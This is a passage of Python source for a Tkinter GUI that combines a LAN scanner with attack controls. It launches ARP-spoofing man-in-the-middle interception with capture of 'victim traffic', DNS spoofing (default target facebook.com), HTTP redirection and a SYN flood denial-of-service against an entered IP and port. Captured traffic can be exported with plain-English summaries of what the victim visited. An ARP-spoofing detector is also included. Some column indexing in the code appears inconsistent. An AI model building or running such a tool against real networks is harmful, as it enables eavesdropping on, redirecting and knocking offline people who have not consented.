        self.spoof_domain_entry.grid(row=0, column=2, padx=5)
        self.spoof_domain_entry.insert(0, "facebook.com")
        
        ttk.Label(dns_frame, text="Spoof IP:").grid(row=0, column=3, padx=5)
        self.spoof_ip_entry = ttk.Entry(dns_frame, width=15)
        self.spoof_ip_entry.insert(0, self.local_ip)
        self.spoof_ip_entry.grid(row=0, column=4, padx=5)
        
        # DNS Redirect URL Row
        self.redirect_active = tk.BooleanVar()
        self.redirect_check = ttk.Checkbutton(dns_frame, text="Enable HTTP Redirect", variable=self.redirect_active, command=self.toggle_redirect_entry)
        self.redirect_check.grid(row=1, column=0, padx=5, pady=5)
        
        ttk.Label(dns_frame, text="Redirect URL:").grid(row=1, column=1, padx=5, pady=5)
        self.redirect_url_entry = ttk.Entry(dns_frame, width=25)
        self.redirect_url_entry.insert(0, "http://google.com")
        self.redirect_url_entry.grid(row=1, column=2, columnspan=2, padx=5, pady=5, sticky='w')

        # Syn Flood Frame
        syn_frame = ttk.LabelFrame(attack_frame, text="3. DoS Attack (SYN Flood)", padding="5")
        syn_frame.pack(fill='x', pady=5)
        
        ttk.Label(syn_frame, text="Target IP:").pack(side='left', padx=5)
        self.syn_target_entry = ttk.Entry(syn_frame, width=15)
        self.syn_target_entry.pack(side='left', padx=5)
        
        ttk.Label(syn_frame, text="Port:").pack(side='left', padx=5)
        self.syn_port_entry = ttk.Entry(syn_frame, width=6)
        self.syn_port_entry.insert(0, "80")
        self.syn_port_entry.pack(side='left', padx=5)
        
        self.start_flood_btn = ttk.Button(syn_frame, text="START FLOOD", command=self.start_syn_flood, style='Danger.TButton')
        self.start_flood_btn.pack(side='left', padx=10)
        
        self.stop_flood_btn = ttk.Button(syn_frame, text="STOP", command=self.stop_syn_flood, state=tk.DISABLED, style='Success.TButton')
        self.stop_flood_btn.pack(side='left', padx=5)

        # Sniffing Results Text Area
        ttk.Label(attack_frame, text="--- MITM SNIFFING RESULTS (Victim Traffic) ---").pack(pady=2)
        # Reduced height to prevent it from taking too much space initially
        self.sniffer_text = tk.Text(attack_frame, height=6, wrap='word', state='disabled', background='#1e1e1e', foreground='#00ff00')
        self.sniffer_text.pack(fill='both', expand=True, padx=5)
        
        sniffer_scrollbar = ttk.Scrollbar(attack_frame, command=self.sniffer_text.yview)
        sniffer_scrollbar.pack(side='right', fill='y')
        self.sniffer_text.config(yscrollcommand=sniffer_scrollbar.set)
        
        # Export Sniffing Data Button
        ttk.Button(attack_frame, text="💾 Export Sniffed Data (PCAP + Explanation)", command=self.export_sniffing_data).pack(pady=5)

        
        # --- Results Treeview (Bottom Pane) ---
        results_frame = ttk.Frame(self.paned_window, padding="5")
        self.paned_window.add(results_frame, weight=3) # Give more weight to results

        self.tree = ttk.Treeview(results_frame, columns=('IP', 'Hostname', 'Vendor', 'OS', 'MAC', 'Ports', 'Services'), show='headings')
        self.tree.heading('IP', text='IP Address')
        self.tree.heading('Hostname', text='Hostname')
        self.tree.heading('Vendor', text='Vendor')
        self.tree.heading('OS', text='OS Detection')
        self.tree.heading('MAC', text='MAC Address')
        self.tree.heading('Ports', text='Open Ports')
        self.tree.heading('Services', text='Services Detected')
        
        self.tree.column('IP', width=110, stretch=tk.NO)
        self.tree.column('Hostname', width=120, stretch=tk.YES) 
        self.tree.column('Vendor', width=100, stretch=tk.NO)
        self.tree.column('OS', width=100, stretch=tk.NO)
        self.tree.column('MAC', width=120, stretch=tk.NO)
        self.tree.column('Ports', width=80, stretch=tk.NO)
        self.tree.column('Services', width=150, stretch=tk.YES)
        
        self.tree.pack(side='left', fill='both', expand=True)
        
        vsb = ttk.Scrollbar(results_frame, orient="vertical", command=self.tree.yview)
        vsb.pack(side='right', fill='y')
        self.tree.configure(yscrollcommand=vsb.set)

        
        # --- Context Menu (Right-Click) Setup ---
        self.context_menu = tk.Menu(self.master, tearoff=0)
        self.context_menu.add_command(label="Show Details", command=self.show_host_details)
        self.context_menu.add_command(label="Ping Host", command=self.ping_selected_host)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Open HTTP (Port 80)", command=lambda: self.quick_access_host(80))
        self.context_menu.add_command(label="Open HTTPS (Port 443)", command=lambda: self.quick_access_host(443))
        
        self.tree.bind("<Button-3>", self.show_context_menu)


    # --- General GUI and Thread Control ---

    def on_close(self):
        """ Stops all threads cleanly when the window is closed. """
        if self.mitm_detector and self.mitm_detector.is_alive():
            self.mitm_detector.stop_sniffing()
            self.mitm_detector.join(timeout=1)
        if self.sniffer_thread and self.sniffer_thread.is_alive():
            self.sniffer_thread.stop_sniffing()
            self.sniffer_thread.join(timeout=1)
        if self.dns_spoofer_thread and self.dns_spoofer_thread.is_alive():
            self.dns_spoofer_thread.stop_spoofing()
            self.dns_spoofer_thread.join(timeout=1)
        if self.spoofer_thread and self.spoofer_thread.is_alive():
            self.spoofer_thread.stop_spoofing() 
            self.spoofer_thread.join(timeout=2)
            
        # Ensure IP forwarding is disabled
        set_ip_forwarding(0)
        
        if self.logger: self.logger.info('SYSTEM', 'Application closing')
        self.master.destroy()

    def setup_theme(self):
        """Apply modern dark theme"""
        style = ttk.Style(self.master)
        style.theme_use('clam')
        
        # Colors
        bg_color = '#1e1e1e'
        fg_color = '#00ff00'
        accent_color = '#333333'
        
        self.master.configure(background=bg_color)
        
        style.configure('TFrame', background=bg_color)
        style.configure('TLabel', background=bg_color, foreground='#e0e0e0')
        style.configure('TLabelframe', background=bg_color, foreground=fg_color)
        style.configure('TLabelframe.Label', background=bg_color, foreground=fg_color, font=('Consolas', 10, 'bold'))
        style.configure('TButton', background=accent_color, foreground='white', borderwidth=0, focuscolor='none')
        style.map('TButton', background=[('active', '#444444')])
        
        style.configure('TEntry', fieldbackground='#2d2d2d', foreground='white', insertcolor='white')
        
        style.configure("Treeview", background="#2d2d2d", foreground="white", fieldbackground="#2d2d2d", borderwidth=0)
        style.configure("Treeview.Heading", background="#333333", foreground="white", relief="flat")
        style.map("Treeview", background=[('selected', '#004400')])
        
        style.configure('Danger.TButton', background='#880000', foreground='white')
        style.map('Danger.TButton', background=[('active', '#aa0000')])
        
        style.configure('Success.TButton', background='#005500', foreground='white')
        style.map('Success.TButton', background=[('active', '#007700')])

    def start_scan(self):
        ports_text = self.port_entry.get().strip()
        custom_ports = []
        try:
            if ports_text:
                custom_ports = [int(p.strip()) for p in ports_text.split(',') if p.strip().isdigit() and 1 <= int(p.strip()) <= 65535]
        except ValueError:
            messagebox.showerror("Invalid Input", "Ports must be a comma-separated list of valid numbers (1-65535).")
            return
        
        self.tree.delete(*self.tree.get_children()) 
        self.progress_bar['value'] = 0
        self.start_button.config(state=tk.DISABLED, text="Scanning...")

        self.scan_thread = ScannerThread(self.ip_range, self, custom_ports)
        self.scan_thread.start()
        
    def stop_scan_ui(self):
        self.start_button.config(state=tk.NORMAL, text="Start Scan")
        self.progress_bar['value'] = 100

    def update_status(self, message):
        self.status_label.config(text=f"Status: {message}")

    def update_progress(self, percentage, message):
        self.progress_bar['value'] = percentage
        self.update_status(f"Scanning... {percentage}% | {message}")
        self.master.update_idletasks()
        
    def display_results(self, results):
        self.tree.delete(*self.tree.get_children()) 
        local_ip = self.local_ip
        self.scan_results = results  # Update stored results
        
        for client in results:
            ip = client['IP']
            mac = client['MAC']
            self.mac_map[ip] = mac # Update mac_map for attack preparation
            
            hostname = client.get('Hostname', 'N/A')
            vendor = client.get('Vendor', 'N/A')
            os_info = client.get('OS', 'Unknown')
            
            # Format ports and services
            ports = client.get('open_ports', [])
            ports_str = ', '.join(map(str, ports)) if ports else ""
            
            services = client.get('services', {})
            services_str = ""
            if services:
                # Format "80:HTTP, 22:SSH"
                services_str = ", ".join([f"{p}:{i.get('service','?')}" for p, i in services.items()])
            
            tag = ('localhost',) if ip == local_ip else ()
            if ip == self.gateway_ip:
                tag = ('gateway',)
            
            self.tree.insert('', tk.END, values=(ip, hostname, vendor, os_info, mac, ports_str, services_str), iid=ip, tags=tag)
            
        self.tree.tag_configure('localhost', background='#e0e0ff', foreground='black')
        self.tree.tag_configure('gateway', background='#ffcccb', foreground='black')

        # Auto-populate the target field
        for client in results:
            if client['IP'] != local_ip and client['IP'] != self.gateway_ip:
                self.target_ip_entry.delete(0, tk.END)
                self.target_ip_entry.insert(0, client['IP'])
                break
    
    def export_json(self):
        """Export results to JSON"""
        if not self.scan_results:
            messagebox.showwarning("Export Error", "No scan results to export.")
            return
        
        try:
            filename = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON files", "*.json")])
            if filename and self.report_gen:
                scan_data = create_scan_data_structure(self.scan_results)
                self.report_gen.generate_json_report(scan_data, filename)
                messagebox.showinfo("Export Success", f"Report saved to {filename}")
                if self.logger: self.logger.info('UI', f"Exported JSON report to {filename}")
        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export JSON: {e}")

    def export_csv(self):
        """Export results to CSV"""
        if not self.scan_results:
            messagebox.showwarning("Export Error", "No scan results to export.")
            return
            
        try:
            filename = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
            if filename and self.report_gen:
                scan_data = create_scan_data_structure(self.scan_results)
                self.report_gen.generate_csv_report(scan_data, filename)
                messagebox.showinfo("Export Success", f"Report saved to {filename}")
                if self.logger: self.logger.info('UI', f"Exported CSV report to {filename}")
        except Exception as e:
             messagebox.showerror("Export Error", f"Failed to export CSV: {e}")

    def export_html(self):
        """Export results to HTML"""
        if not self.scan_results:
            messagebox.showwarning("Export Error", "No scan results to export.")
            return
            
        try:
            filename = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML files", "*.html")])
            if filename and self.report_gen:
                scan_data = create_scan_data_structure(self.scan_results)
                self.report_gen.generate_html_report(scan_data, filename)
                messagebox.showinfo("Export Success", f"Report saved to {filename}")
                if self.logger: self.logger.info('UI', f"Exported HTML report to {filename}")
        except Exception as e:
             messagebox.showerror("Export Error", f"Failed to export HTML: {e}")
                
    def export_sniffing_data(self):
        """Export sniffed data to PCAP and a beginner-friendly explanation file."""
        if not hasattr(self, 'sniffing_logs') or not self.sniffing_logs:
             messagebox.showwarning("Export Error", "No sniffing data available to export.")
             return
             
        try:
            filename = filedialog.asksaveasfilename(defaultextension=".pcap", filetypes=[("PCAP files", "*.pcap")])
            if not filename:
                return
                
            # 1. Save PCAP (Copy temp file)
            if hasattr(self, 'temp_pcap') and os.path.exists(self.temp_pcap):
                shutil.copy2(self.temp_pcap, filename)
            else:
                messagebox.showwarning("Warning", "Original PCAP capture file not found. Only text log will be saved.")
                
            # 2. Save Explanation Text File
            txt_filename = filename.replace('.pcap', '_explained.txt')
            with open(txt_filename, 'w') as f:
                f.write("=== NETWORK TRAFFIC EXPLANATION ===\n")
                f.write(f"Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                f.write("This file explains the captured network traffic in simple terms.\n\n")
                
                for log in self.sniffing_logs:
                    explanation = self.translate_log_to_simple_english(log)
                    f.write(f"{explanation}\n")
                    f.write("-" * 50 + "\n")
                    
            messagebox.showinfo("Export Success", f"Saved PCAP to {filename}\nSaved Explanation to {txt_filename}")
            if self.logger: self.logger.info('UI', f"Exported Sniffing data to {filename}")

        except Exception as e:
            messagebox.showerror("Export Error", f"Failed to export data: {e}")

    def translate_log_to_simple_english(self, log):
        """Translates technical sniff logs to beginner friendly text."""
        try:
            # log format: [HR:MN:SC] [PROTO] info...
            parts = log.split('] ', 1)
            if len(parts) < 2: return log
            
            time_part = parts[0].strip('[')
            content = parts[1]
            
            if "[HTTP]" in content:
                # Format: [HTTP] src -> dst (Request) OR [HTTP] src -> dst (Raw)
                msg = content.replace("[HTTP] ", "")
                if "->" in msg:
                    src, rest = msg.split("->")
                    rest = rest.strip()
                    dst = rest.split('(')[0].strip() if '(' in rest else rest
                    return f"At {time_part}, the target device visited the website: '{dst}'."
                    
            elif "[DNS]" in content:
                # Format: [DNS] src query: domain
                if "query:" in content:
                    domain = content.split("query:")[1].strip()
                    return f"At {time_part}, the target asked for the IP address of: '{domain}'."
                    
            elif "[HTTPS]" in content:
                 if "->" in content:
                     dst = content.split("->")[1].split(':')[0].strip()
                     return f"At {time_part}, the target connected securely (HTTPS) to: {dst}."
            
            elif "[FTP]" in content:
                return f"At {time_part}, the target used FTP (File Transfer) to connect to a server."
                
            return f"At {time_part}, technical network traffic detected: {content}"
            
        except Exception:
            return log

    def add_sniffer_result(self, result):
        """ Appends a new result line to the sniffer text area. """
        self.sniffer_text.config(state='normal')
        self.sniffer_text.insert(tk.END, result + "\n")
        self.sniffer_text.see(tk.END) 
        self.sniffer_text.config(state='disabled')
        if not hasattr(self, 'sniffing_logs'):
            self.sniffing_logs = []
        self.sniffing_logs.append(result)
        
    def clear_sniffer_results(self):
        """ Clears the sniffer text area. """
        self.sniffer_text.config(state='normal')
        self.sniffer_text.delete(1.0, tk.END)
        self.sniffer_text.config(state='disabled')
        self.sniffing_logs = []

    # --- MITM Detection and Attack Control ---

    def mitm_alert(self, ip, reported_mac, true_mac):
        """ Displays the MITM attack warning pop-up (called from the detection thread). """
        alert_message = (
            "ARP Spoofing Detected!\n\n"
            f"Gateway IP: {ip}\n"
            f"TRUE MAC:   {true_mac}\n"
            f"FAKE MAC:   {reported_mac}\n\n"
            "A malicious host is attempting a Man-in-the-Middle attack!"
        )
        self.master.after(0, lambda: messagebox.showerror("SECURITY ALERT: MITM ATTACK", alert_message))
        self.master.after(0, lambda: self.update_status("!!! MITM ATTACK DETECTED !!!"))

    def start_attack(self):
        """ Launches the ARP Spoofing attack and the sniffer thread. """
        if self.spoofer_thread and self.spoofer_thread.is_alive():
            return
            
        target_ip = self.target_ip_entry.get().strip()
        gateway_ip = self.gateway_ip
        
        if not target_ip:
            messagebox.showerror("Error", "Please enter a valid Target IP.")
            return

        if target_ip not in self.mac_map:
            messagebox.showerror("Error", f"Target MAC address for {target_ip} not found. Run a full scan first!")
            return
        if gateway_ip not in self.mac_map:
             messagebox.showerror("Error", f"Gateway MAC address for {gateway_ip} not found. Cannot launch attack.")
             return


        target_mac = self.mac_map[target_ip]
        gateway_mac = self.mac_map[gateway_ip]
        
        if self.mitm_detector and self.mitm_detector.is_alive():
            self.mitm_detector.stop_sniffing()

        try:
            # Start ARP Spoofer
            self.spoofer_thread = ArpSpooferThread(self, target_ip, gateway_ip, target_mac, gateway_mac)
            self.spoofer_thread.start()
            self.add_sniffer_result(f"[*] ATTACK STARTED: {target_ip} <-> {gateway_ip}")
            
            self.clear_sniffer_results()
            self.temp_pcap = f"session_{int(time.time())}.pcap"
            self.sniffer_thread = MitmSnifferThread(self, target_ip, self.temp_pcap)
            self.sniffer_thread.start()
            
            # Start DNS Spoofer if enabled
            if self.dns_var.get():
                spoof_domain = self.spoof_domain_entry.get().strip()
                spoof_ip = self.spoof_ip_entry.get().strip()
                if not spoof_ip: spoof_ip = self.local_ip
                
                spoof_map = {spoof_domain: spoof_ip}
                self.dns_spoofer_thread = DnsSpooferThread(self, target_ip, spoof_map)
                self.dns_spoofer_thread.start()
                if self.logger: self.logger.info('ATTACK', f"Starting DNS Spoofing: {spoof_domain} -> {spoof_ip}")

            # Start HTTP Redirect if enabled
            if self.redirect_active.get():
                 redirect_url = self.redirect_url_entry.get().strip()
                 self.redirect_thread = HttpRedirectThread(self, redirect_url)
                 self.redirect_thread.start()
                 if self.logger: self.logger.info('ATTACK', f"Starting HTTP Redirect to {redirect_url}")
            
            self.start_attack_button.config(state=tk.DISABLED)
            self.stop_attack_button.config(state=tk.NORMAL)
            
        except Exception as e:
            messagebox.showerror("Attack Launch Failed", f"Could not launch attack thread: {e}")
            if self.logger: self.logger.error('ATTACK', f"Failed to start attack: {e}")
            self.stop_attack_ui()

    def stop_attack(self):
        """ Stops the ARP Spoofing and Sniffing threads. """
        if self.sniffer_thread and self.sniffer_thread.is_alive():
            self.sniffer_thread.stop_sniffing()
            
        if self.dns_spoofer_thread and self.dns_spoofer_thread.is_alive():
            self.dns_spoofer_thread.stop_spoofing()

        if self.redirect_thread and self.redirect_thread.is_alive():
            self.redirect_thread.stop_server()
            self.redirect_thread = None
        
        if self.spoofer_thread and self.spoofer_thread.is_alive():
            self.spoofer_thread.stop_spoofing()
            self.update_status("Stopping attack... Restoring network, please wait.")
        else:
            self.stop_attack_ui()

    def stop_attack_ui(self):
        """ Resets the attack UI elements and restarts detector. """
        self.start_attack_button.config(state=tk.NORMAL)
        self.stop_attack_button.config(state=tk.DISABLED)
        
        # Restart the MITM Detector thread after restoration
        if self.gateway_mac != "N/A (Failed to get MAC)":
            self.mitm_detector = MitmDetectorThread(self, self.gateway_ip, self.gateway_mac)
            self.mitm_detector.start()
            self.update_status("Status: Ready to scan. Monitoring resumed.")

        self.add_sniffer_result("--- Network Restoration Complete. Sniffing Halted ---")
        self.sniffer_thread = None

    def toggle_redirect_entry(self):
        """ Auto-fills the spoof IP with local IP if redirect is enabled """
        if self.redirect_active.get():
            self.spoof_ip_entry.delete(0, tk.END)
            self.spoof_ip_entry.insert(0, self.local_ip)
            
    def start_syn_flood(self):
        target = self.syn_target_entry.get()
        try:
            port = int(self.syn_port_entry.get())
        except:
            messagebox.showerror("Error", "Port must be an integer")
            return
            
        if not target:
            messagebox.showerror("Error", "Target IP required")
            return
            
        self.syn_flood_thread = SynFloodThread(self, target, port)
        self.syn_flood_thread.start()
        
        self.start_flood_btn.config(state=tk.DISABLED)
        self.stop_flood_btn.config(state=tk.NORMAL)
        
    def stop_syn_flood(self):
        if self.syn_flood_thread:
            self.syn_flood_thread.stop_flood()
            self.syn_flood_thread = None
            
        self.start_flood_btn.config(state=tk.NORMAL)
        self.stop_flood_btn.config(state=tk.DISABLED)
        
    # --- Context Menu Handler Functions ---

    def show_context_menu(self, event):
        selected_item = self.tree.identify_row(event.y)
        if selected_item:
            self.tree.selection_set(selected_item)
            self.context_menu.tk_popup(event.x_root, event.y_root)
        try:
            self.context_menu.grab_release()
        except:
             pass

    def get_selected_host_info(self):
        selected_item = self.tree.selection()
        if not selected_item:
            return None, None, None
        
        item_id = selected_item[0]
        ip = self.tree.item(item_id, 'values')[0]
        mac = self.tree.item(item_id, 'values')[3]
        return item_id, ip, mac

    def show_host_details(self):
        _, ip, _ = self.get_selected_host_info()
        if ip:
            values = self.tree.item(self.tree.selection()[0], 'values')
            hostname = values[1]
            vendor = values[2]
            mac = values[3]
            
            messagebox.showinfo("Host Details", 
                                f"IP Address: {ip}\n"
                                f"Hostname/User: {hostname}\n"
                                f"Vendor: {vendor}\n"
                                f"MAC Address: {mac}")
        else:
            messagebox.showwarning("Selection Error", "Please select a device first.")

    def quick_access_host(self, port):
        _, ip, _ = self.get_selected_host_info()
        if ip:
            start_browser(ip, port)
        else:
            messagebox.showwarning("Selection Error", "Please select a device first.")

    def ping_selected_host(self):
        _, ip, _ = self.get_selected_host_info()
        if not ip:
            messagebox.showwarning("Selection Error", "Please select a device first.")
            return

        self.start_button.config(state=tk.DISABLED, text="Pinging...")
        self.update_status(f"Pinging {ip}...")

        threading.Thread(target=self._run_ping_in_thread, args=(ip,), daemon=True).start()

    def _run_ping_in_thread(self, ip):
        try:
            count_flag = "-n" if os.name == 'nt' else "-c"
            
            result = subprocess.run(['ping', count_flag, '4', ip], capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                summary = "Host is UP!"
                if 'time=' in result.stdout or 'Average' in result.stdout:
                    latency_line = next((line for line in result.stdout.split('\n') if 'time=' in line or 'Average' in line), "Ping Successful.")
                    summary = f"Host UP! {latency_line.strip()}"
                
                messagebox.showinfo(f"Ping Result: {ip}", summary)
            else:
                summary = "Host is DOWN or Filtered (No response)."
                messagebox.showerror(f"Ping Result: {ip}", summary)
                
        except subprocess.TimeoutExpired:
            summary = "Ping Failed: Timeout (Host unreachable)."
            messagebox.showerror(f"Ping Result: {ip}", summary)
        except Exception as e:
            summary = f"Ping Failed: System Error - {e}"
            messagebox.showerror(f"Ping Result: {ip}", summary)
            
        self.master.after(0, lambda: self.start_button.config(state=tk.NORMAL, text="Start Scan"))
        self.master.after(0, lambda: self.update_status("Status: Ready to scan."))


    def add_camera_button(self, ip, port):
        item_id = ip
        if self.tree.exists(item_id):
            self.tree.set(item_id, 'Camera', f"View Stream ({port})")
            self.tree.tag_configure('camera', background='#ccffcc')
            
            current_tags = list(self.tree.item(item_id, 'tags'))
            current_tags.append('camera')
            self.tree.item(item_id, tags=current_tags)
            
            if not hasattr(self.master, 'is_bound'):
                 self.tree.bind('<Button-1>', self.handle_tree_click)
                 self.master.is_bound = True 

    def handle_tree_click(self, event):
        item = self.tree.identify_row(event.y)
        
        if 'camera' in self.tree.item(item, 'tags'):
            values = self.tree.item(item, 'values')
            ip = values[0]
            port_text = values[4] 
            try:
                port = int(port_text.split('(')[1].split(')')[0])
                start_browser(ip, port)
            except Exception:
                messagebox.showerror("Error", f"Could not determine port for {ip}.")


# --- 5. MAIN EXECUTION ---

def main_application():
    """ Runs the GUI after VENV and Scapy are confirmed. """
    if not import_scapy_module():
        return

    if os.name != 'nt' and os.geteuid() != 0:
        messagebox.showwarning("Privilege Warning", 
                               "The script is running, but network operations require root/administrator privileges.\n"
                               "The scan/attack may fail if privileges are insufficient.")
    
    root = tk.Tk()
    CyberReconApp(root)
    root.mainloop()


if __name__ == "__main__":
    setup_and_run()
